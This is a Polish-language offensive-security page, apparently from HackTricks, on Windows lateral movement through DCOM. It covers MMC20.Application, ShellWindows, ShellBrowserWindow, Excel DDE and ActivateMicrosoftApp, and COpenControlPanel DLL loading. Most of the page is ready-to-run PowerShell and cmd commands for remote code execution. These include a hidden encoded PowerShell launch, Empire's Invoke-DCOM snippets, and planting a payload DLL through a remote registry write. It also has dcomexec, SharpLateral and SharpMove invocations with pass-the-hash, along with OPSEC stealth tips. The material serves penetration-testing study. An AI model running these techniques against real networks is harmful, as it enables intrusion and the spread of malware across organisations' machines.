# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

Lateral movement przez DCOM jest atrakcyjny, ponieważ wykorzystuje istniejące serwery COM udostępniane przez RPC/DCOM zamiast tworzyć usługę lub zaplanowane zadanie. W praktyce oznacza to, że początkowe połączenie zwykle rozpoczyna się na TCP/135, a następnie przechodzi na dynamicznie przypisane porty RPC o wysokich numerach.

## Wymagania wstępne i pułapki

- Zwykle potrzebujesz uprawnień lokalnego administratora na celu, a zdalny serwer COM musi zezwalać na zdalne uruchamianie/aktywację.
- Od **14 marca 2023 r.** firma Microsoft wymusza hardening DCOM w obsługiwanych systemach. Starsi klienci, którzy żądają niskiego poziomu uwierzytelniania aktywacji, mogą napotkać błędy, o ile nie wynegocjują co najmniej `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Współczesne klienty Windows zwykle automatycznie podnoszą ten poziom, więc aktualne narzędzia zazwyczaj nadal działają.<sup>[[3]](#references)</sup>
- Ręczne lub skryptowe wykonywanie poleceń przez DCOM zazwyczaj wymaga TCP/135 oraz zakresu dynamicznych portów RPC celu. Jeśli używasz Impacket's `dcomexec.py` i chcesz otrzymać z powrotem dane wyjściowe poleceń, zwykle potrzebujesz także dostępu SMB do `ADMIN$` (lub innego udziału z prawem odczytu i zapisu).
- Jeśli RPC/DCOM działa, ale SMB jest blokowane, `dcomexec.py -nooutput` nadal może się przydać do wykonywania poleceń bez uzyskiwania danych wyjściowych.

Szybkie kontrole:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

Więcej informacji o tej technice znajdziesz w [oryginalnym wpisie o MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Obiekty Distributed Component Object Model (DCOM) oferują interesujące możliwości interakcji z obiektami przez sieć. Firma Microsoft udostępnia obszerną dokumentację zarówno DCOM, jak i Component Object Model (COM), dostępną [tutaj dla DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) oraz [tutaj dla COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Listę aplikacji DCOM można pobrać za pomocą polecenia PowerShell:

```bash
Get-CimInstance Win32_DCOMApplication
```

Obiekt COM [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) umożliwia skryptowanie operacji przystawek MMC. Warto zauważyć, że obiekt ten zawiera metodę `ExecuteShellCommand` w `Document.ActiveView`. Więcej informacji o tej metodzie można znaleźć [tutaj](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Sprawdź, uruchamiając:<sup>[[6]](#references)</sup>

Ta funkcja umożliwia wykonywanie poleceń przez sieć za pomocą aplikacji DCOM. Aby zdalnie komunikować się z DCOM jako administrator, można użyć PowerShella w następujący sposób:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

To polecenie łączy się z aplikacją DCOM i zwraca instancję obiektu COM. Następnie można wywołać metodę ExecuteShellCommand, aby uruchomić proces na zdalnym hoście. Proces obejmuje następujące kroki:

Sprawdź metody:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Uzyskaj RCE:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

Ostatni argument określa styl okna. Wartość `7` pozostawia okno zminimalizowane. W praktyce wykonanie oparte na MMC często powoduje, że zdalny proces `mmc.exe` uruchamia payload, co różni się od obiektów opartych na Explorerze opisanych poniżej.

## ShellWindows & ShellBrowserWindow

**Więcej informacji o tej technice znajdziesz w oryginalnym wpisie [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Zaobserwowano, że obiekt **MMC20.Application** nie ma wartości `LaunchPermission` specyficznej dla aplikacji.<sup>[[2]](#references)</sup> Samo to nie przyznaje dostępu: COM sprawdza ACL `DefaultLaunchPermission` komputera oraz obowiązujące ograniczenia uruchamiania/dostępu na poziomie całego komputera.<sup>[[9]](#references)[[10]](#references)</sup> Więcej szczegółów można znaleźć w tym wątku [tutaj](https://twitter.com/tiraniddo/status/817532039771525120). Zalecane jest także użycie OleView .NET autorstwa [@tiraniddo](https://twitter.com/tiraniddo) do filtrowania obiektów bez jawnego Launch Permission.

Wyróżniono dwa konkretne obiekty, `ShellBrowserWindow` i `ShellWindows`, ze względu na brak jawnych Launch Permissions.<sup>[[2]](#references)</sup> Brak wartości `LaunchPermission` w `HKCR:\AppID\{guid}` oznacza, że nie ma specyficznej dla aplikacji listy ACL uruchamiania; **nie** oznacza to, że aktywacja zdalna jest nieograniczona.<sup>[[9]](#references)[[10]](#references)</sup>

W porównaniu z `MMC20.Application` te obiekty są często mniej widoczne z perspektywy OPSEC, ponieważ polecenie zwykle uruchamia się jako proces potomny `explorer.exe` na zdalnym hoście, a nie `mmc.exe`.

### ShellWindows

W przypadku `ShellWindows`, który nie ma ProgID, metody .NET `Type.GetTypeFromCLSID` i `Activator.CreateInstance` umożliwiają utworzenie instancji obiektu przy użyciu jego CLSID. W tym celu OleView .NET służy do pobrania CLSID dla `ShellWindows`. Po utworzeniu instancji można z nią wchodzić w interakcję za pomocą metody `WindowsShell.Item`, co umożliwia wywołanie metody takiej jak `Document.Application.ShellExecute`.<sup>[[2]](#references)</sup>

Podano przykładowe polecenia PowerShell służące do utworzenia instancji obiektu i zdalnego wykonywania poleceń:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` jest podobny, ale można utworzyć jego instancję bezpośrednio za pomocą jego CLSID i wykonać pivot do `Document.Application.ShellExecute`:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Ruch lateralny z użyciem obiektów DCOM programu Excel

Ruch lateralny można uzyskać, wykorzystując obiekty DCOM programu Excel. Szczegółowe informacje można znaleźć w omówieniu wykorzystania Excel DDE do ruchu lateralnego przez DCOM na [blogu Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Projekt Empire udostępnia skrypt PowerShell, który pokazuje, jak wykorzystać program Excel do zdalnego wykonania kodu (RCE) poprzez manipulowanie obiektami DCOM. Poniżej znajdują się fragmenty skryptu dostępnego w [repozytorium GitHub projektu Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), przedstawiające różne metody wykorzystania programu Excel do RCE:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

Niedawne badania poszerzyły ten obszar o metodę `ActivateMicrosoftApp()` z `Excel.Application`. Kluczowa idea polega na tym, że Excel może próbować uruchamiać starsze aplikacje Microsoftu, takie jak FoxPro, Schedule Plus czy Project, wyszukując je w systemowej zmiennej `PATH`. Jeśli operator może umieścić payload o jednej z oczekiwanych nazw w zapisywalnej lokalizacji należącej do zmiennej `PATH` na komputerze docelowym, Excel go uruchomi.<sup>[[4]](#references)</sup>

Wymagania dla tego wariantu:

- Uprawnienia lokalnego administratora na komputerze docelowym
- Excel zainstalowany na komputerze docelowym
- Możliwość zapisania payloadu w zapisywalnym katalogu należącym do zmiennej `PATH` na komputerze docelowym

Praktyczny przykład wykorzystujący wyszukiwanie FoxPro (`FOXPROW.exe`):

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

Jeśli na hoście atakującym nie jest zarejestrowany lokalny ProgID `Excel.Application`, utwórz instancję obiektu zdalnego za pomocą CLSID:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

Wartości, których nadużywano w praktyce:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — ładowanie zarejestrowanej biblioteki DLL Panelu sterowania

Klasa `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) udostępnia interfejs `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Jej metoda `Open()` powoduje załadowanie przez zdalny proces `dllhost.exe` bibliotek DLL Panelu sterowania zarejestrowanych pod kluczem `Control Panel\Cpls`. W testowanych systemach klasa nie ma jawnych uprawnień do uruchamiania ani dostępu, więc dziedziczy domyślną politykę DCOM (która zwykle wymaga uprawnień administratora do zdalnej aktywacji). Wystarczy dowolna nazwa elementu, aby `Open()` przetworzyła zarejestrowane biblioteki DLL; payload nie musi mieć rozszerzenia `.cpl`, ale musi być prawidłową biblioteką DLL o odpowiedniej architekturze.<sup>[[7]](#references)</sup>

Ten prymityw to **stage-and-trigger**, a nie samo wykonywanie poleceń: najpierw skopiuj bibliotekę DLL na cel i utwórz wartość `REG_EXPAND_SZ`, która wskazuje tę bibliotekę, a następnie aktywuj obiekt przez DCOM. Na przykład z poziomu administracyjnego systemu Windows:<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

Publiczny klient [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) implementuje nieudokumentowane wywołanie DCOM za pomocą Impacket. Wystarczy podać dowolną nazwę elementu Panelu sterowania; klient może zgłosić błąd RPC, mimo że `dllhost.exe` załadował bibliotekę DLL.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

Operacyjnie ta ścieżka wymaga również kanału zapisu plików i zdalnego dostępu do rejestru, przez co generuje więcej szumu niż `MMC20`/`ShellWindows`. Powoduje efekt uboczny w postaci utrwalania, ponieważ późniejsze otwarcie Panelu sterowania może ponownie załadować ten sam wpis. Usuń tę wartość po wykonaniu i szukaj nieoczekiwanych wartości w `Control Panel\Cpls` oraz nietypowych załadowań DLL w `dllhost.exe`.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Narzędzia do automatyzacji ruchu bocznego

Wyróżniono dwa narzędzia do automatyzacji tych technik:

- **Invoke-DCOM.ps1**: Skrypt PowerShell udostępniony przez projekt Empire, który ułatwia wywoływanie różnych metod wykonywania kodu na zdalnych maszynach. Skrypt jest dostępny w repozytorium Empire na GitHubie.

- **SharpLateral**: Narzędzie przeznaczone do zdalnego wykonywania kodu, którego można użyć za pomocą polecenia:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## Narzędzia automatyczne

- Skrypt PowerShell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) pozwala łatwo wywoływać wszystkie opisane sposoby wykonywania kodu na innych maszynach.
- Możesz użyć `dcomexec.py` z Impacket, aby wykonywać polecenia w zdalnych systemach za pomocą DCOM. Obecne wersje obsługują `ShellWindows`, `ShellBrowserWindow` i `MMC20`, a domyślnie używają `ShellWindows`.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- Możesz również użyć [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- Możesz także użyć [**SharpMove**](https://github.com/0xthirteen/SharpMove)

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [Lateral Movement przy użyciu obiektu COM MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement przez DCOM: runda 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442 — zarządzanie zmianami dotyczącymi obejścia funkcji zabezpieczeń serwera Windows DCOM (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: wykorzystanie możliwości aplikacji DCOM Excel](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Wykorzystanie Excel DDE do Lateral Movement przez DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - Klasa aplikacji MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Używanie obiektów DCOM do zdalnego wykonywania poleceń](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM: Dodatek B, zachowanie produktu - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
